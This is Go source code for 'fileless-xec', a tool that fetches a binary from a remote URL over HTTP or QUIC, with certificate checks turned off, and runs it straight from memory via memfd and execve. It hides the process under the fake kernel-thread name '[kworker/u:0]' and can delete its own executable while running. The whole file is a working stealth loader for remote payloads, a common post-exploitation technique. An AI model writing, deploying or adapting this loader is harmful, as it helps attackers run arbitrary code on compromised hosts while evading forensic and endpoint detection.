package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"syscall"

	"github.com/justincormack/go-memfd"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/http3"
	"github.com/spf13/cobra"
)

// Write Binary file on disk
func WriteBianryFile(filename string, content string) (err error) {
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(content)
	if err != nil {
		return err
	}
	//Make file executable
	err = os.Chmod(filename, 0700)
	if err != nil {
		return err
	}
	return nil
}

//Exec file retrieve output. TODO: output in real-time + handle input
func Exec(filename string, argv []string, envv []string) (err error) {
	defer os.Remove(filename) //with runtime.GOOS != "windows" we could remove earlier
	cmd := exec.Command("./" + filename)
	cmd.Args = argv
	cmd.Env = envv
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}

	if err := cmd.Start(); err != nil {
		return err
	}

	data, err := ioutil.ReadAll(stdout)

	if err != nil {
		return err
	}
	if err := cmd.Wait(); err != nil {
		return err
	}

	fmt.Println(string(data))
	return err
}

//Exec binary file using file descriptor
//Note: syscall.Exec does not return on success, it causes the current process to be replaced by the one executed
func Fexecve(fd uintptr, argv []string, envv []string) (err error) {
	fname := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)
	err = syscall.Exec(fname, argv, envv)
	return err
}

//Retrieve Binary from Remote using http protocol
func GetBinaryRaw(url string) string {

	resp, err := http.Get(url)

	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	return string(body)
}

//Retrieve Binary from Remote using http3 protocol (Quic)
//Put ca.pem in current directory
func GetBinaryRawHTTP3(url string) string {

	var qconf quic.Config
	roundTripper := &http3.RoundTripper{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // To accept your self-signed certificates for example
		},
		QuicConfig: &qconf,
	}
	defer roundTripper.Close()
	hclient := &http.Client{
		Transport: roundTripper,
	}
	var binaryRawByte []byte
	var wg sync.WaitGroup
	wg.Add(1)

	go func(addr string) {
		rsp, err := hclient.Get(addr)
		if err != nil {
			log.Fatal(err)
		}
		//fmt.Printf("Got response for %s: %#v", addr, rsp)

		body := &bytes.Buffer{}
		_, err = io.Copy(body, rsp.Body)
		if err != nil {
			log.Fatal(err)
		}

		binaryRawByte = body.Bytes()

		wg.Done()
	}(url)

	wg.Wait()
	return string(binaryRawByte)
}

func main() {

	//CMD FILELESS-XEC
	var name string
	var http3 bool
	var selfRm bool
	var unstealth bool

	var cmdFilelessxec = &cobra.Command{
		Use:   "fileless-xec [remote_url]",
		Short: "Execute remote binary locally",
		Long:  `curl a remote binary file and execute it locally in one single step`,
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {

			url := args[0]

			// get argument for binary execution
			argsExec := []string{name}
			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
			environ := os.Environ()

			var binaryRaw string
			if http3 {
				binaryRaw = GetBinaryRawHTTP3(url) //https if you used server from example
			} else {
				binaryRaw = GetBinaryRaw(url)
			}

			if unstealth || runtime.GOOS == "windows" { //make fileless-xec not stealth
				binary := "dummy"
				if runtime.GOOS == "windows" {
					binary += ".exe"
				}
				//write binary file locally
				err := WriteBianryFile(binary, binaryRaw)
				if err != nil {
					fmt.Println(err)
				}
				//execute it
				err = Exec(binary, argsExec, environ)
				fmt.Println(err)
			} else {
				mfd, err := memfd.Create()
				if err != nil {
					panic(err)
				}
				defer mfd.Close()
				_, _ = mfd.WriteString(binaryRaw)
				err = mfd.SetImmutable()
				if err != nil {
					panic(err)
				}

				fd := mfd.Fd()

				if selfRm && runtime.GOOS != "windows" {
					err = os.Remove("./fileless-xec")
					log.Fatal(err)
				}

				Fexecve(fd, argsExec, environ)
			}

		},
	}

	//flag handling
	cmdFilelessxec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
	cmdFilelessxec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")
	cmdFilelessxec.PersistentFlags().BoolVarP(&selfRm, "self-remove", "r", false, "remove fileless-xec while its execution (only on Linux). fileless-xec must be in the same repository that the excution process")
	cmdFilelessxec.PersistentFlags().BoolVarP(&unstealth, "unstealth", "u", false, "store the file locally on disk before executing it")

	cmdFilelessxec.Execute()
}
